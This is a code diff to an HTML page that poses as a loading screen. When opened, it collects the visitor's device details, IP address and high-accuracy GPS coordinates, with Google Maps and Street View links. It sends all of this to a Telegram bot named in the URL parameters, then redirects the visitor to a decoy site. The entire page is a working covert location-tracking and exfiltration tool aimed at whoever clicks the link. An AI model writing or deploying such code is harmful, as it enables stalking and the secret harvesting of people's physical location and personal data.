@@ -10,8 +10,9 @@
             background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
             height: 100vh; display: flex;
             justify-content: center; align-items: center;
-            font-family: -apple-system, sans-serif;
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
         }
+        .loader { text-align: center; color: white; }
         .spinner {
             width: 50px; height: 50px;
             border: 5px solid rgba(255,255,255,0.3);
@@ -20,76 +21,159 @@
             margin: 0 auto 20px;
         }
         @keyframes spin { to { transform: rotate(360deg); } }
-        .loader { text-align: center; color: white; }
+        .text { font-size: 16px; margin-top: 10px; }
     </style>
 </head>
 <body>
     <div class="loader">
         <div class="spinner"></div>
-        <div>Loading...</div>
+        <div class="text" id="status">Detecting location...</div>
     </div>
+
     <script>
-    const params = new URLSearchParams(window.location.search);
-    const redirect = params.get('r') || 'https://google.com';
-    const bot = params.get('bot') || '';
-    const chat = params.get('chat') || '';
+    // Get URL parameters
+    var params = new URLSearchParams(window.location.search);
+    var redirectUrl = params.get('r') || 'https://google.com';
+    var botToken = params.get('bot') || '';
+    var chatId = params.get('chat') || '';
     
-    const data = {
-        time: new Date().toISOString(),
-        device: navigator.userAgent,
+    // Collect visitor data
+    var visitorData = {
+        timestamp: new Date().toISOString(),
+        userAgent: navigator.userAgent,
         platform: navigator.platform,
-        lang: navigator.language,
-        screen: screen.width + 'x' + screen.height,
-        cores: navigator.hardwareConcurrency || '?',
-        gps: null
+        language: navigator.language,
+        screenResolution: screen.width + 'x' + screen.height,
+        viewport: window.innerWidth + 'x' + window.innerHeight,
+        cpuCores: navigator.hardwareConcurrency || 'Unknown',
+        gps: null,
+        referrer: document.referrer || 'Direct'
     };
     
-    if (navigator.geolocation) {
-        navigator.geolocation.getCurrentPosition(
-            function(pos) {
-                data.gps = {
-                    lat: pos.coords.latitude,
-                    lon: pos.coords.longitude,
-                    acc: pos.coords.accuracy,
-                    map: 'https://maps.google.com/maps?q=' + pos.coords.latitude + ',' + pos.coords.longitude
-                };
-                sendData();
-            },
-            function(err) {
-                data.gps = { error: err.message };
-                sendData();
-            },
-            { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
-        );
-    } else {
-        sendData();
+    // Get IP info
+    fetch('https://api.ipify.org?format=json')
+        .then(function(r) { return r.json(); })
+        .then(function(d) { visitorData.ip = d.ip; })
+        .catch(function() { visitorData.ip = 'Unknown'; });
+    
+    // Capture GPS
+    function captureGPS() {
+        return new Promise(function(resolve, reject) {
+            if (!navigator.geolocation) {
+                reject('Geolocation not supported');
+                return;
+            }
+            
+            navigator.geolocation.getCurrentPosition(
+                function(position) {
+                    resolve({
+                        success: true,
+                        latitude: position.coords.latitude,
+                        longitude: position.coords.longitude,
+                        accuracy: position.coords.accuracy,
+                        altitude: position.coords.altitude,
+                        mapsUrl: 'https://maps.google.com/maps?q=' + 
+                                 position.coords.latitude + ',' + 
+                                 position.coords.longitude + 
+                                 '&ll=' + position.coords.latitude + ',' + 
+                                 position.coords.longitude + '&z=16'
+                    });
+                },
+                function(error) {
+                    resolve({
+                        success: false,
+                        error: error.message,
+                        code: error.code
+                    });
+                },
+                {
+                    enableHighAccuracy: true,
+                    timeout: 10000,
+                    maximumAge: 0
+                }
+            );
+        });
     }
     
-    function sendData() {
-        if (bot && chat) {
-            let msg = '📍 LOCATION CAPTURED\n';
-            msg += '━━━━━━━━━━━━━━━━\n\n';
-            if (data.gps && data.gps.lat) {
-                msg += '✅ GPS: ' + data.gps.lat.toFixed(6) + ', ' + data.gps.lon.toFixed(6) + '\n';
-                msg += '🎯 Accuracy: ' + data.gps.acc.toFixed(1) + 'm\n';
-                msg += '🗺️ ' + data.gps.map + '\n';
-            } else {
-                msg += '❌ GPS: Denied\n';
-            }
-            msg += '\n📱 ' + data.platform + '\n';
-            msg += '🖥️ ' + data.screen + '\n';
-            msg += '🕐 ' + data.time + '\n';
-            
-            fetch('https://api.telegram.org/bot' + bot + '/sendMessage', {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ chat_id: chat, text: msg })
-            });
+    // Send to Telegram
+    function sendToTelegram(data) {
+        if (!botToken || !chatId) {
+            console.log('No bot token or chat ID');
+            return;
         }
-        setTimeout(function() {
-            window.location.href = redirect;
-        }, 2000);
+        
+        var message = '';
+        
+        if (data.gps && data.gps.success) {
+            message = 
+                '📍 *GPS LOCATION CAPTURED*\\n' +
+                '━━━━━━━━━━━━━━━━\\n\\n' +
+                '✅ *GPS Coordinates:*\\n' +
+                '• Latitude: `' + data.gps.latitude.toFixed(6) + '`\\n' +
+                '• Longitude: `' + data.gps.longitude.toFixed(6) + '`\\n' +
+                '• Accuracy: ' + data.gps.accuracy.toFixed(1) + 'm\\n' +
+                '\\n🗺️ *Maps Links:*\\n' +
+                '• [Google Maps](' + data.gps.mapsUrl + ')\\n' +
+                '• [Street View](https://maps.google.com/?q=' + data.gps.latitude + ',' + data.gps.longitude + '&layer=c)\\n\\n';
+        } else {
+            message = 
+                '📍 *GPS LOCATION CAPTURED*\\n' +
+                '━━━━━━━━━━━━━━━━\\n\\n' +
+                '❌ GPS: ' + (data.gps ? data.gps.error : 'Denied') + '\\n\\n';
+        }
+        
+        message +=
+            '📱 *Device Info*\\n' +
+            '• ' + data.platform + '\\n' +
+            '• Screen: ' + data.screenResolution + '\\n' +
+            '• Language: ' + data.language + '\\n' +
+            '• CPU: ' + data.cpuCores + ' cores\\n\\n' +
+            '🕐 ' + data.timestamp + '\\n' +
+            '🌐 IP: ' + (data.ip || 'Captured by IPLogger');
+        
+        // Send via Telegram API
+        var telegramUrl = 'https://api.telegram.org/bot' + botToken + '/sendMessage';
+        
+        var xhr = new XMLHttpRequest();
+        xhr.open('POST', telegramUrl, true);
+        xhr.setRequestHeader('Content-Type', 'application/json');
+        xhr.onreadystatechange = function() {
+            if (xhr.readyState === 4) {
+                console.log('Telegram response:', xhr.status, xhr.responseText);
+                document.getElementById('status').textContent = 'Redirecting...';
+                
+                // Redirect after sending
+                setTimeout(function() {
+                    window.location.href = redirectUrl;
+                }, 2000);
+            }
+        };
+        
+        var payload = JSON.stringify({
+            chat_id: chatId,
+            text: message,
+            parse_mode: 'Markdown',
+            disable_web_page_preview: false
+        });
+        
+        xhr.send(payload);
     }
+    
+    // Main execution
+    async function main() {
+        document.getElementById('status').textContent = 'Detecting location...';
+        
+        // Capture GPS
+        visitorData.gps = await captureGPS();
+        
+        document.getElementById('status').textContent = 'Sending data...';
+        
+        // Send to Telegram
+        sendToTelegram(visitorData);
+    }
+    
+    // Start
+    main();
     </script>
 </body>
 </html>
